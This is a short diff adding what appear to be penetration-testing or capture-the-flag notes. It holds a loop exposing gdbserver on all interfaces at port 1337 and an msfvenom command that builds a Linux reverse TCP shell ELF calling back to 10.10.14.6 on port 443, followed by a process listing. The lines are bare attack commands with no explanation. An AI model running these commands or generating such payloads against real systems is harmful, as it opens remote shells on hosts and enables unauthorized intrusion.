@@ -1,0 +1,7 @@
+/bin/sh -c while true;
+    do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; 
+done
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 PrependFork=true -f elf -o rev.elf
+
+ps auxww
